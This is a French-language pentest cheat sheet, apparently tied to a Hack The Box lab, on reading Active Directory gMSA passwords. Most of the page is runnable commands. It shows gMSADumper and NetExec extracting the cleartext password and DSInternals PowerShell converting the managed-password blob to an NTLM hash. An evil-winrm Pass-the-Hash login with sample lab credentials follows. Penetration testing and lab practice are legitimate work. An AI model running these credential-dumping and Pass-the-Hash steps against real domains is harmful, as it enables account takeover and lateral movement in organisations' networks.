# Read the GMSA Password

{% embed url="https://swisskyrepo.github.io/InternalAllTheThings/active-directory/pwd-read-gmsa/?ref=benheater.com#reading-gmsa-password" %}

{% embed url="https://gist.github.com/kdejoyce/f0b8f521c426d04740148d72f5ea3f6f?ref=benheater.com#file-gmsa_permissions_collection-ps1" %}

{% embed url="https://www.netwrix.com/gmsa_exploitation_attack.html?ref=benheater.com" %}

Un **gMSA** est un compte de service AD dont le mot de passe est géré automatiquement par le **KDS (Key Distribution Service)**.\
Il est **long, complexe, change régulièrement** → mais **n’est jamais tapé à la main**.\
👉 En revanche, certains outils permettent de le lire / convertir pour exploitation (ex: Pass-the-Hash).

***

### 1️⃣ gMSADumper (Python)

#### Installation & usage :

```bash
git clone https://github.com/micahvandeusen/gMSADumper
cd gMSADumper
virtualenv .
source bin/activate
python3 -m pip install -r requirements.txt

python3 gMSADumper.py -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' -l dc01.haze.htb -d haze.htb
```

* **+ :** Récupère le blob `msDS-ManagedPassword` via LDAP.
* **+ :** Donne directement le mot de passe en clair du gMSA.
* **– :** Nécessite Python + dépendances.

#### Exemple sortie :

```
gMSA Account: Haze-IT-Backup$
Password: S0m3_Rand0m_GMSA_P@ssw0rd!
```

***

### 2️⃣ NetExec (ex CrackMapExec)

#### Commande simple :

```bash
nxc ldap dc01.haze.htb -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' --gmsa
```

* **+ :** Très rapide, intégré dans un outil déjà utilisé en pentest (NetExec).
* **+ :** Pas besoin d’installer DSInternals ni scripts Python.
* **– :** Affiche directement le mot de passe → à manipuler avec précaution.

***

### 3️⃣ DSInternals (PowerShell)

#### Étapes :

1. Télécharger + préparer module :

```bash
pwsh -c "Save-Module DSInternals -Path ."
zip -r DSInternals.zip DSInternals
# Upload sur la cible via evil-winrm
Expand-Archive DSInternals.zip
mkdir "$env:UserProfile\Documents\WindowsPowerShell\Modules\DSInternals"
Copy-Item -Recurse .\DSInternals\DSInternals\5.1\* "$env:UserProfile\Documents\WindowsPowerShell\Modules\DSInternals"
Import-Module DSInternals
```

2. Extraction du mot de passe gMSA :

```powershell
$targetGmsa = Get-ADServiceAccount -Identity 'Haze-IT-Backup' -Property 'msDS-ManagedPassword'
$converted = ConvertFrom-ADManagedPasswordBlob $targetGmsa.'msDS-ManagedPassword'
$secureString = ConvertTo-SecureString $converted.'CurrentPassword' -AsPlainText -Force
ConvertTo-NTHash -Password $secureString
```

* **+ :** Méthode native PowerShell (pas besoin d’outils externes côté AD).
* **+ :** Conversion automatique → NTLM Hash directement utilisable pour **Pass-the-Hash**.
* **– :** Plus verbeux, nécessite PowerShell 5.1+ et DSInternals.

***

### 🔑 Exploitation après extraction

* Avec **mot de passe en clair** → connexion RDP / services directement.
* Avec **NTLM Hash** → Pass-the-Hash via `evil-winrm`, `smbexec`, `wmiexec`, etc.

#### Exemple :

```bash
evil-winrm -i dc01.haze.htb -u 'Haze-IT-Backup$' -H 'ab45e0f0c7d0a92b12ce9843fbaabc2c'
```

***

## 📌 Tableau comparatif

| Outil           | Sortie obtenue        | Avantage principal                | Limite principale    |
| --------------- | --------------------- | --------------------------------- | -------------------- |
| **gMSADumper**  | Mot de passe en clair | Flexible, script Python portable  | Installe deps Python |
| **NetExec**     | Mot de passe en clair | Ultra simple et rapide (1 ligne)  | Moins discret        |
| **DSInternals** | NTLM hash + password  | Conversion directe → PTH possible | Plus verbeux         |

***
